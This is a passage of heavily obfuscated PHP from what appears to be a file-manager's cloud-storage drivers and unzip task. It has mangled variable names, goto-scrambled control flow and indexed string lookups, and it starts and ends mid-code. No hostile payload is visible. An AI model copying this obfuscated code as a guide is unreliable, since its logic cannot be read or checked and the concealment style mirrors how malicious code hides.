$f”¦•˜èÕ¯[33]; } $d¦ÁŠÌª¤Ó = fopen($c´™í¯»¹µ, $f”¦•˜èÕ¯[1169]); if (!$d¦ÁŠÌª¤Ó) { return !1; } goto BÇÂñëóíÈ; dˆ‚¦ëç™œ: return $CôåÓ‹¶çÖ; goto CÜåİ¨éÜ; CÜåİ¨éÜ: } public function upload($aô—ÂÓé—, $fö³¥ê¼¬º, $cÖÂÑÍ‹‚İ = false, $fººŸ¶çİ = REPEAT_REPLACE) { $dª»èÌ½†˜ = $this->copyFile($fö³¥ê¼¬º, $aô—ÂÓé—); return $dª»èÌ½†˜ ? $this->getPathOuter($aô—ÂÓé—) : !1; } public function download($d¥³Ç‘¤ó¥, $a³å©Ûíœº) { return $this->iconvSystem($d¥³Ç‘¤ó¥); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($A»”¬ëÉÁ­) { parent::__construct($A»”¬ëÉÁ­); $this->signatureVersion($_SERVER[Æ][200]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($E°àöÆŸÆ¥) { parent::__construct($E°àöÆŸÆ¥); $this->signatureVersion($_SERVER[Æ][200]); } public function fileOutLink($B¥Â¸ÂØïö) { $D¨Ô¯‰¢ ¥ =& $_SERVER[Æ]; if (substr($B¥Â¸ÂØïö, 0, 7) == $D¨Ô¯‰¢ ¥[1115]) { $B¥Â¸ÂØïö = $D¨Ô¯‰¢ ¥[1116] . substr($B¥Â¸ÂØïö, 7); } header($D¨Ô¯‰¢ ¥[156] . $B¥Â¸ÂØïö); die; } } goto bìÜ¸õÓÑê; EŞºÃß“…: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto A‹ö’¥øÍˆ; A¤ÏºÈ­ˆÒ: Hook::bind($c•å…®Äğã[1035], array($this, $c•å…®Äğã[1506])); $Cáé—ôĞ±‰ =& $this->task; $Cáé—ôĞ±‰[$c•å…®Äğã[1507]] = $c•å…®Äğã[1040]; goto aù³Ä”Š‰±; aù³Ä”Š‰±: if (!$Cáé—ôĞ±‰[$c•å…®Äğã[1340]]) { $Cáé—ôĞ±‰[$c•å…®Äğã[1340]] = LNG($c•å…®Äğã[1508]); } goto fèÚàŸ´„“; A‹ö’¥øÍˆ: $c•å…®Äğã =& $_SERVER[Æ]; parent::startAfter(); Hook::bind($c•å…®Äğã[1504], array($this, $c•å…®Äğã[1505])); goto A¤ÏºÈ­ˆÒ; fèÚàŸ´„“: } protected function endAfter() { $F»İ­Ñ–öˆ =& $_SERVER[Æ]; parent::endAfter(); Hook::unbind($F»İ­Ñ–öˆ[1504], array($this, $F»İ­Ñ–öˆ[1505])); Hook::unbind($F»İ­Ñ–öˆ[1035], array($this, $F»İ­Ñ–öˆ[1506])); } public function updateAfter() { $C‚™ïô‡É¦ =& $_SERVER[Æ]; $Cİ®‚Œ¼âŸ =& $this->task; if (!$Cİ®‚Œ¼âŸ[$C‚™ïô‡É¦[977]] || !$Cİ®‚Œ¼âŸ[$C‚™ïô‡É¦[696]]) { return; } if ($Cİ®‚Œ¼âŸ[$C‚™ïô‡É¦[1507]] == $C‚™ïô‡É¦[1040]) { $f…¥öŒ«¶ø = 0; if ($Cİ®‚Œ¼âŸ[$C‚™ïô‡É¦[1479]]) { $f…¥öŒ«¶ø = $Cİ®‚Œ¼âŸ[$C‚™ïô‡É¦[1480]] / $Cİ®‚Œ¼âŸ[$C‚™ïô‡É¦[1479]]; } $Cİ®‚Œ¼âŸ[$C‚™ïô‡É¦[1435]] = $f…¥öŒ«¶ø * 0.3; } else { if ($Cİ®‚Œ¼âŸ[$C‚™ïô‡É¦[1507]] == $C‚™ïô‡É¦[301]) { $f…¥öŒ«¶ø = $Cİ®‚Œ¼âŸ[$C‚™ïô‡É¦[989]] / $Cİ®‚Œ¼âŸ[$C‚™ïô‡É¦[977]]; $Cİ®‚Œ¼âŸ[$C‚™ïô‡É¦[1435]] = 0.3 + $f…¥öŒ«¶ø * 0.4; } else { if ($Cİ®‚Œ¼âŸ[$C‚™ïô‡É¦[1507]] == $C‚™ïô‡É¦[103]) { $Cã‚˜¾•Îø = 0; if ($Cİ®‚Œ¼âŸ[$C‚™ïô‡É¦[1481]] == $C‚™ïô‡É¦[103]) { $Cã‚˜¾•Îø = $Cİ®‚Œ¼âŸ[$C‚™ïô‡É¦[1480]]; } $f…¥öŒ«¶ø = ($Cİ®‚Œ¼âŸ[$C‚™ïô‡É¦[1484]] + $Cã‚˜¾•Îø) / $Cİ®‚Œ¼âŸ[$C‚™ïô‡É¦[696]]; $Cİ®‚Œ¼âŸ[$C‚™ïô‡É¦[1435]] = 0.3 + 0.4 + $f…¥öŒ«¶ø * 0.3; } } } if ($Cİ®‚Œ¼âŸ[$C‚™ïô‡É¦[1435]] > 0) { $EÙ¼ïƒ£ğÂ = timeFloat() - $Cİ®‚Œ¼âŸ[$C‚™ïô‡É¦[1437]] - $Cİ®‚Œ¼âŸ[$C‚™ïô‡É¦[1440]]; $Cİ®‚Œ¼âŸ[$C‚™ïô‡É¦[1441]] = $EÙ¼ïƒ£ğÂ * (1 - $Cİ®‚Œ¼âŸ[$C‚™ïô‡É¦[1435]]) / $Cİ®‚Œ¼âŸ[$C‚™ïô‡É¦[1435]]; } } public function addFile($B ËÓÂ›ù) { goto aîòÄˆÖœõ; EÊÈ‰’Åé: $fè¼ãÓâ«’[$e³¼£©£Ñ¢[979]] = $e³¼£©£Ñ¢[1496]; $fè¼ãÓâ«’[$e³¼£©£Ñ¢[1481]] = $e³¼£©£Ñ¢[1040]; $fè¼ãÓâ«’[$e³¼£©£Ñ¢[696]] = $BÇ¦Ã¨«ÌÎ[$e³¼£©£Ñ¢[77]]; goto Aã¹º†¿½ê; cùÀ´ìá¨Â: $this->update(); goto d·ù‹ªÇ§É; Aã¹º†¿½ê: $fè¼ãÓâ«’[$e³¼£©£Ñ¢[977]] = 1; $eÃñõ¶»ãí = 0; $fè¼ãÓâ«’[$e³¼£©£Ñ¢[1488]] = array($e³¼£©£Ñ¢[1489] => $eÃñõ¶»ãí + 1, $e³¼£©£Ñ¢[386] => $BÇ¦Ã¨«ÌÎ[$e³¼£©£Ñ¢[28]], $e³¼£©£Ñ¢[75] => $BÇ¦Ã¨«ÌÎ[$e³¼£©£Ñ¢[75]], $e³¼£©£Ñ¢[466] => $BÇ¦Ã¨«ÌÎ[$e³¼£©£Ñ¢[466]] ? $BÇ¦Ã¨«ÌÎ[$e³¼£©£Ñ¢[466]] : $BÇ¦Ã¨«ÌÎ[$e³¼£©£Ñ¢[75]]); goto cùÀ´ìá¨Â; aîòÄˆÖœõ: $e³¼£©£Ñ¢ =& $_SERVER[Æ]; $fè¼ãÓâ«’ =& $this->task; $BÇ¦Ã¨«ÌÎ = IO::info($B ËÓÂ›ù); goto AË¿¼ÁÚ; AË¿¼ÁÚ: $fè¼ãÓâ«’[$e³¼£©£Ñ¢[1477]] = $BÇ¦Ã¨«ÌÎ[$e³¼£©£Ñ¢[28]]; $fè¼ãÓâ«’[$e³¼£©£Ñ¢[1479]] = $BÇ¦Ã¨«ÌÎ[$e³¼£©£Ñ¢[77]]; $fè¼ãÓâ«’[$e³¼£©£Ñ¢[1480]] = 0; goto EÊÈ‰’Åé; d·ù‹ªÇ§É: } public function unzipAfter($D§ê—šøÊÄ) { goto BïØ¤ŞáÑ†; C‹ªÖ‡¤¤Û: $E§‹šèÜÁ‹ = IO::infoWithChildren($D§ê—šøÊÄ); $D£†Ô‹Î›í = 0; $Bê‚ˆÛ¤‘[$D¿Úã«™—÷[1488]] = array($D¿Úã«™—÷[1489] => $D£†Ô‹Î›í + 1, $D¿Úã«™—÷[386] => $E§‹šèÜÁ‹[$D¿Úã«™—÷[28]], $D¿Úã«™—÷[75] => $E§‹šèÜÁ‹[$D¿Úã«™—÷[75]], $D¿Úã«™—÷[466] => $E§‹šèÜÁ‹[$D¿Úã«™—÷[466]] ? $E§‹šèÜÁ‹[$D¿Úã«™—÷[466]] : $E§‹šèÜÁ‹[$D¿Úã«™—÷[75]]); goto EÉÕå˜™; BïØ¤ŞáÑ†: $D¿Úã«™—÷ =& $_SERVER[Æ]; $Bê‚ˆÛ¤‘ =& $this->task; $Bê‚ˆÛ¤‘[$D¿Úã«™—÷[1507]] = $D¿Úã«™—÷[103]; goto C‹ªÖ‡¤¤Û; D«ÔãÑÑÏõ: $Bê‚ˆÛ¤‘[$D¿Úã«™—÷[1477]] = $D¿Úã«™—÷[33]; $Bê‚ˆÛ¤‘[$D¿Úã«™—÷[1484]] = 0; $Bê‚ˆÛ¤‘[$D¿Úã«™—÷[696]] = $E§‹šèÜÁ‹[$D¿Úã«™—÷[77]]; goto C´’§ª•; EÉÕå˜™: if ($E§‹šèÜÁ‹[$D¿Úã«™—÷[29]] == $D¿Úã«™—÷[167]) { $Bê‚ˆÛ¤‘[$D¿Úã«™—÷[977]] = 1; } else { $Bê‚ˆÛ¤‘[$D¿Úã«™—÷[977]] = $E§‹šèÜÁ‹[$D¿Úã«™—÷[80]][$D¿Úã«™—÷[78]]; } $Bê‚ˆÛ¤‘[$D¿Úã«™—÷[979]] = $D¿Úã«™—÷[33]; $Bê‚ˆÛ¤‘[$D¿Úã«™—÷[1481]] = 0; goto cç¬£×Ö£­; C´’§ª•: $this->update(); self::log($D¿Úã«™—÷[1509] . json_encode(array($Bê‚ˆÛ¤‘, $E§‹šèÜÁ‹))); goto FÉËè—‚Œç; cç¬£×Ö£­: $Bê‚ˆÛ¤‘[$D¿Úã«™—÷[989]] = 0; $Bê‚ˆÛ¤‘[$D¿Úã«™—÷[1479]] = 0; $Bê‚ˆÛ¤‘[$D¿Úã«™—÷[1480]] = 0; goto D«ÔãÑÑÏõ; FÉËè—‚Œç: } public function nameParse($Dø·ò¦¾½£) { goto d„…ãõÛäã; d„…ãõÛäã: $C«×‡ñ·´´ =& $_SERVER[Æ]; $f¹ˆĞ«¸½ =& $this->task; if ($f¹ˆĞ«¸½[$C«×‡ñ·´´[1507]] == $C«×‡ñ·´´[1040]) { $f¹ˆĞ«¸½[$C«×‡ñ·´´[1507]] = $C«×‡ñ·´´[301]; $f¹ˆĞ«¸½[$C«×‡ñ·´´[1484]] = 0; $f¹ˆĞ«¸½[$C«×‡ñ·´´[696]] = 0; } goto A‰©ìÌœ¡í; A‰©ìÌœ¡í: $CÛ¥‹”±Ü† = get_path_this($Dø·ò¦¾½£); if (strstr($CÛ¥‹”±Ü†, $C«×‡ñ·´´[91])) { $f¹ˆĞ«¸½[$C«×‡ñ·´´[989]] += 1; $f¹ˆĞ«¸½[$C«×‡ñ·´´[977]] += 1; } $f¹ˆĞ«¸½[$C«×‡ñ·´´[1477]] = $Dø·ò¦¾½£; goto C»î—ŠÈË†; C»î—ŠÈË†: $this->update(); goto FæÎé‰÷ËÈ; FæÎé‰÷ËÈ: } } $dÓİƒ´§Ä§ = LIB_DIR . $_SERVER[Æ][778]; $c”ªéª¼Õå = $_SERVER[Æ][779]; goto b‰îŸ½‘é‹; DŞ¾°Ñ•ÎÃ: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($B“†Œ°Ï®Ÿ, $E×øÍéÈ„· = 0) { parent::__construct(); $this->source = $B“†Œ°Ï®Ÿ; $this->sourceSize = $E×øÍéÈ„·; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($bØù·´º½º = false) { return $this->sourceSize; } public function getContent($Cïêõ™‹ § = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $e’ãÎ·¶÷æ = ftell($this->source); $bÌË¢ìøÖ = @fread($this->source, $this->sourceSize); fseek($this->source, $e’ãÎ·¶÷æ); return $bÌË¢ìøÖ; } } public function fileSubstr($eõÆÖí–ùƒ = false, $c÷áš¸¤ï = 0, $aÅ˜Ç…´©¹ = 0) { if (!$aÅ˜Ç…´©¹) { $aÅ˜Ç…´©¹ = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $c÷áš¸¤ï, $aÅ˜Ç…´©¹); } if ($this->sourceType == self::TYPE_FILE) { $d‹ó´¦¹ÍÊ = ftell($this->source); fseek($this->source, $d‹ó´¦¹ÍÊ + $c÷áš¸¤ï); $BïÇĞ¿‘†Ş = @fread($this->source, $aÅ˜Ç…´©¹); fseek($this->source, $d‹ó´¦¹ÍÊ); return $BïÇĞ¿‘†Ş; } } public function hashMd5($f¸­ØçÂ†¢ = false) { return md5($this->getContent()); } public static function hash($fŸ¤ˆìù¬, $Föæ‰¹ë×· = 0) { $D±Ï©ñ‡˜ = new PathDriverStream($fŸ¤ˆìù¬, $Föæ‰¹ë×·); return $D±Ï©ñ‡˜->hashSimple($fŸ¤ˆìù¬); } public static function md5($cù›è…“¬Æ, $føŠİ£®½Í = 0) { $aã²ÜÈÇå = new PathDriverStream($cù›è…“¬Æ, $føŠİ£®½Í); return $aã²ÜÈÇå->hashMd5($cù›è…“¬Æ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\160\x3a\x2f\x2f\166\60\x2e\141\160\x69\56\165\160\171\x75\x6e\x2e\143\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($dè¼ÛÈ¸³Õ) { parent::__construct(); $this->_init($dè¼ÛÈ¸³Õ); } public function _init($C„¦ª…„) { foreach ($C„¦ª…„ as $eí±ë£šã => $Eï‡ÊÄè™) { if (isset($this->{$eí±ë£šã})) { $this->{$eí±ë£šã} = $Eï‡ÊÄè™; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[Æ][1240], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($A½“°»»ŠÁ, $f´ƒ¯å³¾ = "\x47\105\124") { $DĞÓí¯ÅãÙ =& $_SERVER[Æ]; $cñ§ßÉ´Ò = gmdate($DĞÓí¯ÅãÙ[1204]); $A…åæ‡Êº = base64_encode(hash_hmac($DĞÓí¯ÅãÙ[1241], "{$f´ƒ¯å³¾}\46{$A½“°»»ŠÁ}\46{$cñ§ßÉ´Ò}", md5("{$this->userpass}"), !0)); $d´§ÈŒˆí = array("\101\x75\x74\x68\157\x72\151\172\x61\164\x69\157\156\72\x55\120\131\125\116\40{$this->username}\x3a{$A…åæ‡Êº}", "\x44\x61\x74\x65\x3a{$cñ§ßÉ´Ò}"); return $d´§ÈŒˆí; } public function ussRequest($a–ê§©øªº, $d¹¨Ğˆ§µÇ = "\x47\x45\x54", $d„ãœÊÔéç = false, $Dï¹é‰á‘¿ = false, $bö„İæƒö¹ = false) { goto c¸É’•¬ÆØ; CÃ”‡­íì: if (!$C¸¿˜â¡„) { return array($Eò—‹Òí³[1032] => !1, $Eò—‹Òí³[1034] => $Eò—‹Òí³[1242]); } if (strtolower($d¹¨Ğˆ§µÇ) == $Eò—‹Òí³[184] || in_array($C¸¿˜â¡„[$Eò—‹Òí³[1032]], array($Eò—‹Òí³[1100], $Eò—‹Òí³[1243]))) { $d„ãœÊÔéç = $C¸¿˜â¡„[$Eò—‹Òí³[1244]]; } else { $d„ãœÊÔéç = json_decode($C¸¿˜â¡„[$Eò—‹Òí³[1034]], !0); if (!$d„ãœÊÔéç) { $d„ãœÊÔéç = $C¸¿˜â¡„[$Eò—‹Òí³[1034]]; } else { if (!$C¸¿˜â¡„[$Eò—‹Òí³[687]] && isset($d„ãœÊÔéç[$Eò—‹Òí³[1245]])) { $d„ãœÊÔéç = $d„ãœÊÔéç[$Eò—‹Òí³[1245]]; } } } return array($Eò—‹Òí³[1032] => $C¸¿˜â¡„[$Eò—‹Òí³[687]], $Eò—‹Òí³[1034] => $d„ãœÊÔéç); goto Eˆ¶–†óÙ°; c¸É’•¬ÆØ: $Eò—‹Òí³ =& $_SERVER[Æ]; $a–ê§©øªº = trim($a–ê§©øªº, $Eò—‹Òí³[8]); $Aƒİæª¥õÏ = "\x2f{$this->bucket}\x2f{$a–ê§©øªº}"; goto dÊÏïÀë¹˜; dÊÏïÀë¹˜: $BªÙÑÍÌ‰Ì = $this->ussHeaders($Aƒİæª¥õÏ, $d¹¨Ğˆ§µÇ); if ($Dï¹é‰á‘¿) { $BªÙÑÍÌ‰Ì = array_merge($BªÙÑÍÌ‰Ì, $Dï¹é‰á‘¿); } $C¸¿˜â¡„ = url_request($this->endpoint . $Aƒİæª¥õÏ, $d¹¨Ğˆ§µÇ, $d„ãœÊÔéç, $BªÙÑÍÌ‰Ì, $bö„İæƒö¹); goto CÃ”‡­íì; Eˆ¶–†óÙ°: } public function mkfile($eİÚæ‹ÒÄñ, $bË¡¤Äï©ø = '', $c‘”×ô†¼² = REPEAT_RENAME) { if ($this->setContent($eİÚæ‹ÒÄñ, $bË¡¤Äï©ø)) { return $this->getPathOuter($eİÚæ‹ÒÄñ); } return !1; } public function mkdir($e˜•Ö×®™Û, $Eø¼›‰‚±í = REPEAT_SKIP) { $D¾âÒ¦²  =& $_SERVER[Æ]; $DÍÎ ò±äß = trim($e˜•Ö×®™Û, $D¾âÒ¦² [8]); if ($this->_isFolder($DÍÎ ò±äß)) { return $this->getPathOuter($DÍÎ ò±äß); } $F¾¼¥óùëã = array($D¾âÒ¦² [1246]); $FœÎƒŒ»¬é = $this->ussRequest($DÍÎ ò±äß, $D¾âÒ¦² [212], !1, $F¾¼¥óùëã); return $FœÎƒŒ»¬é[$D¾âÒ¦² [1032]] ? $this->getPathOuter($DÍÎ ò±äß) : !1; } public function copyFile($EÒÇÂ’•, $d‡‹ƒ¯é™) { $dİÍğˆåóÄ =& $_SERVER[Æ]; $EˆÂ¦Å†‚‡ = array($dİÍğˆåóÄ[1247] . "\57{$this->bucket}\57{$EÒÇÂ’•}", $dİÍğˆåóÄ[1248]); $e„¿§å¦Ãƒ = $this->ussRequest($d‡‹ƒ¯é™, $dİÍğˆåóÄ[214], !1, $EˆÂ¦Å†‚‡); return $e„¿§å¦Ãƒ[$dİÍğˆåóÄ[1032]] ? !0 : !1; } public function moveFile($D¢Ã—ÂŠ¶º, $cÆô½á¤) { $C·•ë‰Â =& $_SERVER[Æ]; $fôîØÙÊ = array($C·•ë‰Â[1249] . "\57{$this->bucket}\57{$D¢Ã—ÂŠ¶º}", $C·•ë‰Â[1248]); $c¨ÄÔ¨Ğ¨ = $this->ussRequest($cÆô½á¤, $C·•ë‰Â[214], !1, $fôîØÙÊ); return $c¨ÄÔ¨Ğ¨[$C·•ë‰Â[1032]] ? !0 : !1; } public function delFile($f†œ¤¼¼˜Ù) { $dïĞâ­Î¢ =& $_SERVER[Æ]; $E‰ÕÏá‰Ÿ” = $this->ussRequest($f†œ¤¼¼˜Ù, $dïĞâ­Î¢[1250]); return $E‰ÕÏá‰Ÿ”[$dïĞâ­Î¢[1032]] ? !0 : !1; } public function delFolder($E¯­‹š½ºÃ) { $D†ö‡› Á =& $_SERVER[Æ]; $aµÀÁÚğÏ = $this->listAll($E¯­‹š½ºÃ); krsort($aµÀÁÚğÏ); foreach ($aµÀÁÚğÏ as $Cø¾öõğÚù) { $this->ussRequest($Cø¾öõğÚù[$D†ö‡› Á[75]], $D†ö‡› Á[1250]); } return $this->ussRequest($E¯­‹š½ºÃ, $D†ö‡› Á[1250]); } public function rename($dÍ§‘›Š×í, $B‡ì‘“¡’‘) { if ($this->isFile($dÍ§‘›Š×í)) { $B‡ì‘“¡’‘ = get_path_father($dÍ§‘›Š×í) . $B‡ì‘“¡’‘; return $this->moveFile($dÍ§‘›Š×í, $B‡ì‘“¡’‘); } return $this->renameObject($dÍ§‘›Š×í, $B‡ì‘“¡’‘); } public function fileInfo($a…†ØŸ Üå, $c„ÕİÀ„¦Û = false, $Eãø“Ææé = array()) { $f¬‘­„è‹ =& $_SERVER[Æ]; if ($c„ÕİÀ„¦Û) { return array($f¬‘­„è‹[28] => $this->pathThis($a…†ØŸ Üå), $f¬‘­„è‹[75] => $this->getPathOuter($f¬‘­„è‹[8] . $a…†ØŸ Üå), $f¬‘­„è‹[29] => $f¬‘­„è‹[167], $f¬‘­„è‹[77] => isset($Eãø“Ææé[$f¬‘­„è‹[325]]) ? $Eãø“Ææé[$f¬‘­„è‹[325]] : 0, $f¬‘­„è‹[160] => $this->ext($a…†ØŸ Üå)); } $CÈ®åò÷Ÿ = array($f¬‘­„è‹[28] => $this->pathThis($a…†ØŸ Üå), $f¬‘­„è‹[75] => $this->getPathOuter($f¬‘­„è‹[8] . $a…†ØŸ Üå), $f¬‘­„è‹[29] => $f¬‘­„è‹[167], $f¬‘­„è‹[187] => 0, $f¬‘­„è‹[107] => isset($bˆ›Ã‹¥«[$f¬‘­„è‹[1251]]) ? $bˆ›Ã‹¥«[$f¬‘­„è‹[1251]] : 0, $f¬‘­„è‹[77] => isset($Eãø“Ææé[$f¬‘­„è‹[325]]) ? $Eãø“Ææé[$f¬‘­„è‹[325]] : 0, $f¬‘­„è‹[160] => $this->ext($a…†ØŸ Üå), $f¬‘­„è‹[188] => !0, $f¬‘­„è‹[189] => !0); if (empty($Eãø“Ææé)) { $Eãø“Ææé = $this->objectMeta($a…†ØŸ Üå); if (!$Eãø“Ææé) { return $CÈ®åò÷Ÿ; } $CÈ®åò÷Ÿ[$f¬‘­„è‹[187]] = $Eãø“Ææé[$f¬‘­„è‹[1252]]; $CÈ®åò÷Ÿ[$f¬‘­„è‹[107]] = $Eãø“Ææé[$f¬‘­„è‹[1253]]; $CÈ®åò÷Ÿ[$f¬‘­„è‹[77]] = $Eãø“Ææé[$f¬‘­„è‹[77]]; } return $CÈ®åò÷Ÿ; } public function folderInfo($B›Œ¾×à“, $Aˆ¡²ÆæŠè = false) { $b†İ†¼ ™î =& $_SERVER[Æ]; if ($Aˆ¡²ÆæŠè) { return array($b†İ†¼ ™î[28] => $this->pathThis($B›Œ¾×à“), $b†İ†¼ ™î[75] => $this->getPathOuter($b†İ†¼ ™î[8] . $B›Œ¾×à“), $b†İ†¼ ™î[29] => $b†İ†¼ ™î[76]); } $dƒ¡¤˜–¡ = array($b†İ†¼ ™î[28] => $this->pathThis($B›Œ¾×à“), $b†İ†¼ ™î[75] => $this->getPathOuter($b†İ†¼ ™î[8] . $B›Œ¾×à“), $b†İ†¼ ™î[29] => $b†İ†¼ ™î[76], $b†İ†¼ ™î[187] => 0, $b†İ†¼ ™î[107] => isset($bš®¸±¨[$b†İ†¼ ™î[1251]]) ? $bš®¸±¨[$b†İ†¼ ™î[1251]] : 0, $b†İ†¼ ™î[1161] => !0, $b†İ†¼ ™î[1162] => !0); if (empty($AƒòİÌĞ³)) { $AƒòİÌĞ³ = $this->objectMeta($B›Œ¾×à“); if (!$AƒòİÌĞ³) { return $dƒ¡¤˜–¡; } $dƒ¡¤˜–¡[$b†İ†¼ ™î[187]] = $AƒòİÌĞ³[$b†İ†¼ ™î[1252]]; $dƒ¡¤˜–¡[$b†İ†¼ ™î[107]] = $AƒòİÌĞ³[$b†İ†¼ ™î[1253]]; } return $dƒ¡¤˜–¡; } private function fileList($A‹ŠŞ•Ë»Œ, $cŞ®ˆõ÷§ = 0, $f÷ßó‰’¶ = 1000) { $FÆÌß¼Í• =& $_SERVER[Æ]; $CĞÁÖØŒùğ = array($FÆÌß¼Í•[1254], $FÆÌß¼Í•[1255] . $f÷ßó‰’¶); if ($cŞ®ˆõ÷§) { $CĞÁÖØŒùğ[] = $FÆÌß¼Í•[1256] . $cŞ®ˆõ÷§; } $c¢¯Íêªª¿ = $this->ussRequest($A‹ŠŞ•Ë»Œ, $FÆÌß¼Í•[216], !1, $CĞÁÖØŒùğ); return !$c¢¯Íêªª¿[$FÆÌß¼Í•[1032]] ? !1 : $c¢¯Íêªª¿[$FÆÌß¼Í•[1034]]; } public function listPath($cÂ­æÌŠ«Ş, $cñ”ÒÆÈŒß = false) { goto C¶®öËÕ·; C¶®öËÕ·: $c´¬„Å¥Ê® =& $_SERVER[Æ]; $A„è—‡’ÙŠ = $c´¬„Å¥Ê®[33]; $fò¿À¹³œ = 1000; goto d‰ë¦òéÍ; d‰ë¦òéÍ: $e¸ŒÍĞàö¥ = $eòãñøÏ­ = array(); $a…´–‰ºàõ = rtrim($cÂ­æÌŠ«Ş, $c´¬„Å¥Ê®[8]) . $c´¬„Å¥Ê®[8]; while (!0) { $f”ğ—áàÈÅ = $this->fileList($cÂ­æÌŠ«Ş, $A„è—‡’ÙŠ, $fò¿À¹³œ); if (!$f”ğ—áàÈÅ) { return !1; } $A„è—‡’ÙŠ = isset($f”ğ—áàÈÅ[$c´¬„Å¥Ê®[1257]]) ? $f”ğ—áàÈÅ[$c´¬„Å¥Ê®[1257]] : $c´¬„Å¥Ê®[33]; $EƒŒÒÉµÜ = isset($f”ğ—áàÈÅ[$c´¬„Å¥Ê®[1258]]) ? $f”ğ—áàÈÅ[$c´¬„Å¥Ê®[1258]] : array(); foreach ($EƒŒÒÉµÜ as $eÊî›åøÍ) { if ($eÊî›åøÍ[$c´¬„Å¥Ê®[29]] == $c´¬„Å¥Ê®[76]) { $e¸ŒÍĞàö¥[] = $this->folderInfo($a…´–‰ºàõ . $eÊî›åøÍ[$c´¬„Å¥Ê®[28]], $cñ”ÒÆÈŒß, $eÊî›åøÍ); } else { $eòãñøÏ­[] = $this->fileInfo($a…´–‰ºàõ . $eÊî›åøÍ[$c´¬„Å¥Ê®[28]], $cñ”ÒÆÈŒß, $eÊî›åøÍ); } } if (count($EƒŒÒÉµÜ) < $fò¿À¹³œ) { break; } } goto BÚÙÁ•íõ§; BÚÙÁ•íõ§: return array($c´¬„Å¥Ê®[74] => $e¸ŒÍĞàö¥, $c´¬„Å¥Ê®[73] => $eòãñøÏ­); goto E™µ£’£Üó; E™µ£’£Üó: } private function recursionAllFiles($F‘Â ¿¼×, &$F‚Üšò‹¯Ï) { $bæö¤ë˜åˆ =& $_SERVER[Æ]; $eã‰‹ºÈí = $bæö¤ë˜åˆ[33]; $CäŞÁë…Ä = 1000; $bŠĞà«ÙõÍ = $bÄ˜‹Üé¹ë = array(); $D´¥Ú¥õ«è = rtrim($F‘Â ¿¼×, $bæö¤ë˜åˆ[8]) . $bæö¤ë˜åˆ[8]; while (!0) { $C³á–·ºÏ = $this->fileList($F‘Â ¿¼×, $eã‰‹ºÈí, $CäŞÁë…Ä); if (!$C³á–·ºÏ) { return !1; } $eã‰‹ºÈí = isset($C³á–·ºÏ[$bæö¤ë˜åˆ[1257]]) ? $C³á–·ºÏ[$bæö¤ë˜åˆ[1257]] : $bæö¤ë˜åˆ[33]; $F‘¤ÂÅøº = isset($C³á–·ºÏ[$bæö¤ë˜åˆ[1258]]) ? $C³á–·ºÏ[$bæö¤ë˜åˆ[1258]] : array(); foreach ($F‘¤ÂÅøº as $c’èÜŠ„¼) { $DÜ‡£‹Ì°‡ = array($bæö¤ë˜åˆ[75] => $D´¥Ú¥õ«è . $c’èÜŠ„¼[$bæö¤ë˜åˆ[28]], $bæö¤ë˜åˆ[76] => $c’èÜŠ„¼[$bæö¤ë˜åˆ[29]] == $bæö¤ë˜åˆ[76] ? 1 : 0, $bæö¤ë˜åˆ[77] => isset($c’èÜŠ„¼[$bæö¤ë˜åˆ[325]]) ? $c’èÜŠ„¼[$bæö¤ë˜åˆ[325]] : 0); $F‚Üšò‹¯Ï[] = $DÜ‡£‹Ì°‡; if ($DÜ‡£‹Ì°‡[$bæö¤ë˜åˆ[76]] == 1) { $this->recursionAllFiles($DÜ‡£‹Ì°‡[$bæö¤ë˜åˆ[75]], $F‚Üšò‹¯Ï); } } if (count($F‘¤ÂÅøº) < $CäŞÁë…Ä) { break; } } } public function has($EçÚÓ•×†, $Dƒ¨“ôù™ß = false, $AœŞ«ÀöÎ = true) { goto BØŒ’ÎÅ†Ç; B¢Ì¾‚áîî: $bŠ¸ŒØÊéù = 0; $BíŞ‚½ğÜ = 0; $DîåÍ’Óò = rtrim($EçÚÓ•×†, $E“ÅÏï³ğ§[8]) . $E“ÅÏï³ğ§[8]; goto F¡•ÂÅ ğÀ; BØŒ’ÎÅ†Ç: $E“ÅÏï³ğ§ =& $_SERVER[Æ]; $dë¶ÇÍÂÇ = $E“ÅÏï³ğ§[33]; $dĞŸõŞÒ–³ = 1000; goto B¢Ì¾‚áîî; F¡•ÂÅ ğÀ: while (!0) { $fÎÖÛ‚‘ = $this->fileList($EçÚÓ•×†, $dë¶ÇÍÂÇ, $dĞŸõŞÒ–³); if (!$fÎÖÛ‚‘) { return !1; } $dë¶ÇÍÂÇ = isset($fÎÖÛ‚‘[$E“ÅÏï³ğ§[1257]]) ? $fÎÖÛ‚‘[$E“ÅÏï³ğ§[1257]] : $E“ÅÏï³ğ§[33]; $B½ŞÔªĞÍà = isset($fÎÖÛ‚‘[$E“ÅÏï³ğ§[1258]]) ? $fÎÖÛ‚‘[$E“ÅÏï³ğ§[1258]] : array(); if (empty($B½ŞÔªĞÍà)) { break; } $c÷İäî˜Æ‚ = array_to_keyvalue($B½ŞÔªĞÍà, $E“ÅÏï³ğ§[33], $E“ÅÏï³ğ§[29]); $AÒ²•›öª = array_count_values($c÷İäî˜Æ‚); $FĞ¹´¿£Ÿù = isset($AÒ²•›öª[$E“ÅÏï³ğ§[76]]) ? $AÒ²•›öª[$E“ÅÏï³ğ§[76]] : 0; $cÃ¤Š‰Ş = count($c÷İäî˜Æ‚) - $FĞ¹´¿£Ÿù; if ($Dƒ¨“ôù™ß) { $BíŞ‚½ğÜ += $FĞ¹´¿£Ÿù; $bŠ¸ŒØÊéù 